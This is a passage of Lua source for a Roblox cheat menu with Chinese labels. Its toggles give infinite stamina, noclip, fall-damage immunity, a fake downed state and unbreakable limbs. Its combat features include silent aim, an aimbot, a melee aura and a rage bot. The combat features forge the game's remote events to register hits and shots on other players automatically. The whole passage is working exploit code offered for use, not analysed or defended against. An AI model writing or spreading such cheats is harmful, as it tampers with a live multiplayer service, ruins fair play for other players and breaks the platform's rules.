                            if type(value) == "table" and rawget(value, "S") then
                                stamina[#stamina + 1] = value
                            end
                        end
                    end)
                    if ss then
                        for _, a in pairs(stamina) do
                            a.S = 100
                        end
                    end
                elseif Methods.Infstamina == "low exploit" then
                    if me.Character then
                        local hum = me.Character:FindFirstChild("Humanoid")
                        if hum and not hum:GetAttribute("ZSPRN_M") then
                            hum:SetAttribute("ZSPRN_M", true)
                        end
                    end
                end
            end))
        else
            if RUNS.Infstamina then
                RUNS.Infstamina:Disconnect()
                RUNS.Infstamina = nil
            end
            if me.Character then
                local hum = me.Character:FindFirstChild("Humanoid")
                if hum then
                    local check = hum:GetAttribute("ZSPRN_M")
                    if check then
                        hum:SetAttribute("ZSPRN_M", nil)
                    end
                end
            end
        end
    end
})
Tabs.Player:Dropdown({
    Title = "无限体力方法",
    Description = "选择实现方法",
    Options = {"Getgc", "low exploit"},
    Default = Methods.Infstamina,
    Callback = function(Value)
        Methods.Infstamina = Value
    end
})
Tabs.Player:Toggle({
    Title = "无坠落伤害",
    Description = "防止坠落伤害",
    Default = functions.Nofalldamage,
    Callback = function(Value)
        functions.Nofalldamage = Value
        if Value then
            if me.Character then
                local ff = Instance.new("ForceField")
                ff.Parent = me.Character
                ff.Visible = false
            end
            regConn(me.CharacterAdded:Connect(function(char)
                if functions.Nofalldamage and char and char:WaitForChild("HumanoidRootPart") and char:WaitForChild("Humanoid") then
                    local ff = Instance.new("ForceField")
                    ff.Parent = char
                    ff.Visible = false
                end
            end))
        else
            if me.Character then
                for _, a in pairs(me.Character:GetChildren()) do
                    if a:IsA("ForceField") and a.Visible == false then
                        a:Destroy()
                    end
                end
            end
        end
    end
})
Tabs.Player:Toggle({
    Title = "穿墙模式",
    Description = "可以穿过墙壁",
    Default = functions.Noclip,
    Callback = function(Value)
        functions.Noclip = Value
        if Value then
            local function LoopNoclip()
                local char = me.Character
                if char then
                    for _, a in pairs(char:GetDescendants()) do
                        if a:IsA("BasePart") and a.CanCollide == true then
                            a.CanCollide = false
                        end
                    end
                end
            end
            RUNS.Noclip = regConn(run.RenderStepped:Connect(LoopNoclip))
        else
            if RUNS.Noclip then
                RUNS.Noclip:Disconnect()
                RUNS.Noclip = nil
            end
        end
    end
})
Tabs.Player:Toggle({
    Title = "伪装倒地",
    Description = "伪装成倒地状态",
    Default = functions.FakeDown,
    Callback = function(Value)
        functions.FakeDown = Value
        if Value then
            local getvalue = CharStats(me).Downed
            getvalue.Value = true
            regConn(getvalue:GetPropertyChangedSignal("Value"):Connect(function()
                if functions.FakeDown then
                    getvalue.Value = true
                end
            end))
        else
            CharStats(me).Downed.Value = false
        end
    end
})
Tabs.Player:Toggle({
    Title = "停止颈部移动",
    Description = "停止角色颈部移动",
    Default = functions.Stopneckmove,
    Callback = function(Value)
        functions.Stopneckmove = Value
        if Value then
            if me.Character then
                me.Character:SetAttribute("NoNeckMovement", true)
            end
            regConn(me.CharacterAdded:Connect(function(char)
                if char and char:FindFirstChild("Humanoid") then
                    if functions.Stopneckmove then
                        char:SetAttribute("NoNeckMovement", true)
                    end
                else
                    repeat wait() until char and char:FindFirstChild("Humanoid")
                    if functions.Stopneckmove then
                        char:SetAttribute("NoNeckMovement", true)
                    end
                end
            end))
        else
            if me.Character then
                local get = me.Character:GetAttribute("NoNeckMovement")
                if get then
                    me.Character:SetAttribute("NoNeckMovement", nil)
                end
            end
        end
    end
})
Tabs.Player:Toggle({
    Title = "肢体不碎",
    Description = "防止肢体断裂",
    Default = functions.Unbreaklimbs,
    Callback = function(Value)
        functions.Unbreaklimbs = Value
        local limbsfolder = CharStats(me).HealthValues
        for _, a in pairs(limbsfolder:GetChildren()) do
            for _, i in pairs(a:GetChildren()) do
                if i and i.Name == "Broken" then
                    if functions.Unbreaklimbs then
                        i.Value = false
                        regConn(i:GetPropertyChangedSignal("Value"):Connect(function()
                            if functions.Unbreaklimbs then
                                i.Value = false
                            end
                        end))
                    end
                end
            end
        end
        regConn(limbsfolder.ChildAdded:Connect(function()
            for _, a in pairs(limbsfolder:GetChildren()) do
                for _, i in pairs(a:GetChildren()) do
                    if i and i.Name == "Broken" then
                        if functions.Unbreaklimbs then
                            i.Value = false
                            regConn(i:GetPropertyChangedSignal("Value"):Connect(function()
                                if functions.Unbreaklimbs then
                                    i.Value = false
                                end
                            end))
                        end
                    end
                end
            end
        end))
    end
})
-- ========= Combat模块 修复：保存连接，关闭Disconnect =========
Tabs.Combat:Toggle({
    Title = "静默瞄准",
    Description = "自动瞄准敌人",
    Default = functions.SilentAim,
    Callback = function(Value)
        functions.SilentAim = Value
        if Value then
            cockie.SilentAimCircle = Drawing.new("Circle")
            cockie.SilentAimCircle.Color = Color3.new(1, 1, 1)
            cockie.SilentAimCircle.Thickness = 2
            cockie.SilentAimCircle.NumSides = 50
            cockie.SilentAimCircle.Radius = SectionSettings.SilentAim.DrawSize
            cockie.SilentAimCircle.Filled = false
            cockie.SilentAimCircle.Visible = true
            cockie.SilentAimCircle.Position = Vector2.new(camera.ViewportSize.X/2, camera.ViewportSize.Y/2)
            local target = nil
            local connRender = regConn(run.RenderStepped:Connect(function()
                target = nil
                local shortest = SectionSettings.SilentAim.DrawSize
                for _, a in pairs(plrs:GetPlayers()) do
                    if a ~= me and a.Character then
                        if SectionSettings.SilentAim.CheckDowned and CharStats(a).Downed.Value == true then
                            continue
                        end
                        if SectionSettings.SilentAim.CheckTeam and a.Team == me.Team then
                            continue
                        end
                        if SectionSettings.SilentAim.CheckWhiteList and table.find(WhiteList, a) then
                            continue
                        end
                        local hrp = a.Character:FindFirstChild("HumanoidRootPart")
                        if hrp then
                            local screenpos, onScreen = camera:WorldToViewportPoint(hrp.Position)
                            if onScreen then
                                local dist = (Vector2.new(camera.ViewportSize.X/2, camera.ViewportSize.Y/2) - Vector2.new(screenpos.X, screenpos.Y)).Magnitude
                                if dist < shortest then
                                    target = a
                                end
                            end
                        end
                    end
                end
            end))
            local VisualizeEvent = rp.Events2.Visualize
            cockie.SilentAimEventConn = regConn(VisualizeEvent.Event:Connect(function(_, ShotCode, _, Gun, _, StartPos, BulletsPerShot)
                if not functions.SilentAim then return end
                if not Gun or not target or not target.Character or not target.Character:FindFirstChild("Humanoid") or target.Character:FindFirstChild("Humanoid").Health == 0 then return end
                if not me.Character or not me.Character:FindFirstChildOfClass("Tool") then return end
                local parts = SectionSettings.SilentAim.TargetParts[math.random(1, #SectionSettings.SilentAim.TargetParts)] or SectionSettings.SilentAim.TargetParts[1] or "Head"
                local targetPart = target.Character:FindFirstChild(parts)
                if not targetPart then return end
                local partPos = targetPart.Position
                local Bullets = {}
                for i = 1, math.clamp(#BulletsPerShot, 1, 100) do
                    table.insert(Bullets, CFrame.new(StartPos, partPos).LookVector)
                end
                task.wait(0.005)
                for i, dir in pairs(Bullets) do
                    rp.Events["ZFKLF__H"]:FireServer("🧈", Gun, ShotCode, i, targetPart, partPos, dir)
                end
                if Gun:FindFirstChild("Hitmarker") then
                    Gun.Hitmarker:Fire(targetPart)
                end
            end))
        else
            if cockie.SilentAimCircle then
                cockie.SilentAimCircle:Remove()
                cockie.SilentAimCircle = nil
            end
            if cockie.SilentAimEventConn then
                cockie.SilentAimEventConn:Disconnect()
                cockie.SilentAimEventConn = nil
            end
        end
    end
})
Tabs.Combat:Slider({
    Title = "静默瞄准范围",
    Description = "调整瞄准范围大小",
    Default = SectionSettings.SilentAim.DrawSize,
    Min = 20,
    Max = 500,
    Callback = function(Value)
        SectionSettings.SilentAim.DrawSize = math.floor(Value)
        if cockie.SilentAimCircle then
            cockie.SilentAimCircle.Radius = SectionSettings.SilentAim.DrawSize
        end
    end
})
Tabs.Combat:Toggle({
    Title = "检查倒地状态",
    Description = "忽略倒地的玩家",
    Default = SectionSettings.SilentAim.CheckDowned,
    Callback = function(Value)
        SectionSettings.SilentAim.CheckDowned = Value
    end
})
Tabs.Combat:Toggle({
    Title = "检查队伍",
    Description = "忽略同队伍玩家",
    Default = SectionSettings.SilentAim.CheckTeam,
    Callback = function(Value)
        SectionSettings.SilentAim.CheckTeam = Value
    end
})
Tabs.Combat:Toggle({
    Title = "自瞄",
    Description = "自动瞄准敌人",
    Default = functions.AimBot,
    Callback = function(Value)
        functions.AimBot = Value
        if Value == true then
            cockie.aimbot_button = Instance.new("TextButton")
            cockie.aimbot_button.Parent = game.CoreGui
            cockie.aimbot_button.Name = "Aim"
            cockie.aimbot_button.BackgroundColor3 = Color3.new(0, 0, 0)
            cockie.aimbot_button.Position = UDim2.new(0.689, 0, 0.521, 0)
            cockie.aimbot_button.Size = UDim2.new(0, 40, 0, 40)
            cockie.aimbot_button.TextSize = 10
            cockie.aimbot_button.TextColor3 = Color3.new(1, 1, 1)
            cockie.aimbot_button.Text = "Aim"
            cockie.aimbot_button.Visible = true
            local target = nil
            local pressed = false
            local aimtarget
            local canusing = false
            local FirstPerson = true
            local predict = 15
            local part
            local randpart = nil
            local LastTick = tick()
            cockie.AimBotCircle = Drawing.new("Circle")
            cockie.AimBotCircle.Color = Color3.new(1, 1, 1)
            cockie.AimBotCircle.Thickness = 2
            cockie.AimBotCircle.NumSides = 50
            cockie.AimBotCircle.Radius = SectionSettings.Aimbot.DrawSize
            cockie.AimBotCircle.Filled = false
            cockie.AimBotCircle.Visible = true
            local centerScreen = Vector2.new(camera.ViewportSize.X/2, camera.ViewportSize.Y/2)
            cockie.AimBotCircle.Position = centerScreen
            local function getClosestTarget()
                local closest, closestDist = nil, SectionSettings.Aimbot.DrawSize
                for _, player in pairs(plrs:GetPlayers()) do
                    if player ~= me and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                        local count = #SectionSettings.Aimbot.TargetParts
                        if count == 0 then
                            part = "Head"
                        elseif count == 1 then
                            part = SectionSettings.Aimbot.TargetParts[count]
                        elseif count > 1 then
                            if tick() - LastTick >= .5 then
                                local rand = math.random(1, count)
                                randpart = SectionSettings.Aimbot.TargetParts[rand]
                                LastTick = tick()
                            end
                            part = randpart or SectionSettings.Aimbot.TargetParts[1]
                        end
                        local pos, onScreen = camera:WorldToViewportPoint(player.Character:FindFirstChild(part).Position)
                        if onScreen then
                            if SectionSettings.Aimbot.CheckTeam and player.Team == me.Team then
                                continue
                            end
                            if SectionSettings.Aimbot.CheckWhiteList and table.find(WhiteList, player) then
                                continue
                            end
                            local centerScreen = Vector2.new(camera.ViewportSize.X/2, camera.ViewportSize.Y/2)
                            local distance = (Vector2.new(pos.X, pos.Y) - centerScreen).Magnitude
                            if distance < closestDist then
                                closestDist = distance
                                closest = player
                            end
                        end
                    end
                end
                return closest
            end
            cockie.aimbot_button.MouseButton1Click:Connect(function()
                pressed = not pressed
                aimtarget = getClosestTarget() or nil
            end)
            cockie.AimbotRenderConn = regConn(run.RenderStepped:Connect(function()
                if FirstPerson then
                    local magnitude = (camera.Focus.p - camera.CFrame.p).Magnitude
                    canusing = magnitude <= 1.5
                end
                if functions.AimBot and pressed and aimtarget and aimtarget.Character then
                    local head = aimtarget.Character:FindFirstChild(part)
                    local humanoid = aimtarget.Character:FindFirstChild("Humanoid")
                    if head and humanoid and humanoid.Health ~= 0 and canusing then
                        local targetPosition = head.Position
                        if SectionSettings.Aimbot.CheckDowned and CharStats(target).Downed.Value == true then
                            return
                        end
                        if SectionSettings.Aimbot.Velocity then
                            targetPosition = targetPosition + head.Velocity / predict
                        end
                        camera.CFrame = camera.CFrame:Lerp(CFrame.new(camera.CFrame.p, targetPosition), 0.9)
                    end
                end
            end))
        else
            if cockie.AimBotCircle then
                cockie.AimBotCircle:Remove()
                cockie.AimBotCircle = nil
            end
            if cockie.aimbot_button then
                cockie.aimbot_button:Destroy()
                cockie.aimbot_button = nil
            end
            --修复：断开渲染循环
            if cockie.AimbotRenderConn then
                cockie.AimbotRenderConn:Disconnect()
                cockie.AimbotRenderConn = nil
            end
        end
    end
})
Tabs.Combat:Toggle({
    Title = "近战光环",
    Description = "自动攻击附近敌人",
    Default = functions.Meleeaura,
    Callback = function(Value)
        functions.Meleeaura = Value
        if Value then
            local remote1 = rp.Events["XMHH.2"]
            local remote2 = rp.Events["XMHH2.2"]
            local part
            local randpart = nil
            local LastTick = tick()
            local AttachTick = tick()
            local attach = false
            local attachcd = .1
            local AttachCD = {
                ["Fists"] = .05,
                ["Knuckledusters"] = .05,
                ["Nunchucks"] = 0.05,
                ["Shiv"] = .05,
                ["Bat"] = 1,
                ["Metal-Bat"] = 1,
                ["Chainsaw"] = 2.5,
                ["Balisong"] = .05,
                ["Rambo"] = .3,
                ["Shovel"] = 3,
                ["Sledgehammer"] = 2,
                ["Katana"] = .1,
                ["Wrench"] = .1,
                ["FireAxe"] = 2.6
            }
            local function Attack(target)
                if not (target and target:FindFirstChild("Head")) then return end
                local mychar = me.Character
                if not mychar then return end
                local TOOL = mychar:FindFirstChildOfClass("Tool")
                if not TOOL then return end
                local AnimFolder = TOOL:FindFirstChild("AnimsFolder")
                if not AnimFolder then return end
                local anim = AnimFolder:FindFirstChild("Slash1")
                if not anim then return end
                if tick() - AttachTick >= attachcd then
                    local result = remote1:InvokeServer("🍞", tick(), TOOL, "43TRFWX", "Normal", tick(), true)
                    attachcd = AttachCD[TOOL.Name] or 1/2
                    if SectionSettings.MeleeAura.ShowAnim then
                        local load = me.Character:FindFirstChildOfClass("Humanoid"):FindFirstChild("Animator"):LoadAnimation(anim)
                        load:Play()
                        load:AdjustSpeed(1.3)
                    end
                    task.wait(0.3 + math.random() * 0.2)
                    if TOOL then
                        local Handle = TOOL:FindFirstChild("WeaponHandle") or TOOL:FindFirstChild("Handle") or me.Character:FindFirstChild("Right Arm")
                        local arg2 = {
                            "🍞",
                            tick(),
                            TOOL,
                            "2389ZFX34",
                            result,
                            true,
                            Handle,
                            target:FindFirstChild(part),
                            target,
                            me.Character.HumanoidRootPart.Position,
                            target:FindFirstChild(part).Position
                        }
                        if TOOL.Name == "Chainsaw" then
                            for i = 1, 15 do
                                remote2:FireServer(unpack(arg2))
                            end
                        else
                            remote2:FireServer(unpack(arg2))
                        end
                        AttachTick = tick()
                    else
                        return
                    end
                end
            end
            cockie.MeleeAuraThread = task.spawn(function()
                while functions.Meleeaura do
                    local mychar = me.Character or me.CharacterAdded:Wait()
                    if mychar then
                        local myhrp = mychar:FindFirstChild("HumanoidRootPart")
                        if myhrp then
                            for _, a in ipairs(plrs:GetPlayers()) do
                                if a ~= me then
                                    local char = a.Character
                                    if char then
                                        local hrp = char:FindFirstChild("HumanoidRootPart")
                                        if hrp then
                                            local distance = (myhrp.Position - hrp.Position).Magnitude
                                            if distance < SectionSettings.MeleeAura.Distance and a.Character:FindFirstChildOfClass("Humanoid").Health ~= 0 and not char:FindFirstChildOfClass("ForceField") then
                                                if SectionSettings.MeleeAura.CheckWhiteList and table.find(WhiteList, a) then
                                                    continue
                                                end
                                                if SectionSettings.MeleeAura.CheckTeam and a.Team == me.Team then
                                                    continue
                                                end
                                                if SectionSettings.MeleeAura.CheckDowned and CharStats(a).Downed.Value == true then
                                                    continue
                                                end
                                                local count = #SectionSettings.MeleeAura.TargetParts
                                                if count == 0 then
                                                    part = "Head"
                                                elseif count == 1 then
                                                    part = SectionSettings.MeleeAura.TargetParts[#SectionSettings.MeleeAura.TargetParts]
                                                elseif count > 1 then
                                                    if tick() - LastTick >= .2 then
                                                        local rand = math.random(1, count)
                                                        randpart = SectionSettings.MeleeAura.TargetParts[rand]
                                                        LastTick = tick()
                                                    end
                                                    part = randpart or SectionSettings.MeleeAura.TargetParts[1]
                                                end
                                                Attack(char)
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                    run.Heartbeat:Wait()
                end
                cockie.MeleeAuraThread = nil
            end)
        else
            if cockie.MeleeAuraThread then
                task.cancel(cockie.MeleeAuraThread)
                cockie.MeleeAuraThread = nil
            end
        end
    end
})
Tabs.Combat:Toggle({
    Title = "显示动画",
    Description = "显示攻击动画",
    Default = SectionSettings.MeleeAura.ShowAnim,
    Callback = function(Value)
        SectionSettings.MeleeAura.ShowAnim = Value
    end
})
Tabs.Combat:Toggle({
    Title = "狂暴模式",
    Description = "自动射击附近敌人",
    Default = functions.RageBot,
    Callback = function(Value)
        functions.RageBot = Value
        if Value then
            local function RandomString(length)
                local res = ""
                for i = 1, length do
                    res = res .. string.char(math.random(97, 122))
                end
                return res
            end
            local function GetClosestEnemy()
                if not me.Character or not me.Character:FindFirstChild("HumanoidRootPart") then return nil end
                local closestEnemy = nil
                local shortestDistance = 100
                for _, player in pairs(plrs:GetPlayers()) do
                    if player == me then continue end
                    local character = player.Character
                    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
                    local rootPart = character and character:FindFirstChild("HumanoidRootPart")
                    if character and rootPart and humanoid and humanoid.Health > 15 and not character:FindFirstChildOfClass("ForceField") then
                        if SectionSettings.RageBot.CheckWhiteList and table.find(WhiteList, player) then
                            continue
                        end
                        local distance = (rootPart.Position - me.Character.HumanoidRootPart.Position).Magnitude
                        if distance < shortestDistance then
                            shortestDistance = distance
                            closestEnemy = player
                        end
                    end
                end
                return closestEnemy
            end
            local function Shoot(target)
                if not target or not target.Character then return end
                local head = target.Character:FindFirstChild("Head")
                if not head then return end
                local tool = me.Character and me.Character:FindFirstChildOfClass("Tool")
                if not tool then return end
                local values = tool:FindFirstChild("Values")
                local hitMarker = tool:FindFirstChild("Hitmarker")
                if not values or not hitMarker then return end
                local ammo = values:FindFirstChild("SERVER_Ammo")
                local storedAmmo = values:FindFirstChild("SERVER_StoredAmmo")
                if not ammo or not storedAmmo then return end
                local hitPosition = head.Position
                local hitDirection = (hitPosition - camera.CFrame.Position).unit
                local randomKey = RandomString(30) ..0
                if tool.Name == "Beretta" or tool.Name == "TEC-9" then
                    if ammo.Value > 0 then
                        rp.Events.GNX_S:FireServer(
                            tick(),
                            randomKey,
                            tool,
                            "FDS9I83",
                            camera.CFrame.Position,
                            {hitDirection},
                            false
                        )
                        task.delay(0.00001, function()
                            rp.Events["ZFKLF__H"]:FireServer(
                                "🧈",
                                tool,
                                randomKey,
                                1,
                                head,
                                hitPosition,
                                hitDirection
                            )
                            ammo.Value = math.max(ammo.Value - 1, 0)
                            hitMarker:Fire(head)
                            storedAmmo.Value = values:FindFirstChild("SERVER_StoredAmmo").Value
                            rp.Events.GNX_R:FireServer(tick(), "KLWE89U0", tool)
                        end)
                    end
                end
            end
            cockie.RageBotThread = task.spawn(function()
                while functions.RageBot do
                    if me.Character and me.Character:FindFirstChildOfClass("Tool") then
                        local target = GetClosestEnemy()
                        if target then
                            Shoot(target)
                        end
                    end
                    run.RenderStepped:Wait()
                end
                cockie.RageBotThread = nil
            end)
        else
            if cockie.RageBotThread then
                task.cancel(cockie.RageBotThread)
                cockie.RageBotThread = nil
            end
        end
    end
})
Tabs.Combat:Toggle({
    Title = "瞬间换弹",
    Description = "瞬间完成换弹",
    Default = functions.Instantreload,
    Callback = function(Value)
        functions.Instantreload =
